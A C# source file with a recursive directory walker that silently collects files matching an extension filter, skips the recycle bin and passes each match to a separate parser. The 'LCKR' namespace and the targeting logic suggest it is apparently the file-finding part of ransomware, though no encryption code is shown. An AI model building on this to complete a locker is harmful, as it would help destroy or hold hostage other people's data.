using System.IO;

namespace FR46_LCKR
{
    internal class Dir_Walkr
    {
        private IFil_ext Fil_ext { get; set; }
        private IFil_Parsr Fil_Parsr { get; set; }

        public Dir_Walkr(IFil_ext fil_Ext, IFil_Parsr fil_Parsr)
        {
            Fil_ext = fil_Ext;
            Fil_Parsr = fil_Parsr;
        }

        // Recursive search for directories

        public void Trav_Dir(string startDir)
        {
            try
            {
                //Process files in directories
                var fil_Entries = Directory.GetFiles(startDir);
                for (var i = 0; i < fil_Entries.Length; i++)
                {
                    Proc_Fil(fil_Entries[i].ToLower());
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch
            {
            }

            try
            {
                //Recursive search next directory

                var subdir_Entries = Directory.GetDirectories(startDir);
                for (var i = 0; i < subdir_Entries.Length; i++)
                {
                    var subdir = subdir_Entries[i];
                    Trav_Dir(subdir);
                    System.Threading.Thread.Sleep(1);
                }
            }
            catch
            {
            }

        }

        private void Proc_Fil(string fPath)
        {
            if (IsTargetFile(fPath))
            {
                Fil_Parsr.Par_File(fPath);
            }
        }

        //Checks file for IsTargetFile == true

        private bool IsTargetFile(string fPath)
        {
            return !fPath.Contains("recycle") && Fil_ext.IsTargetFile(fPath);
        }
    }
}
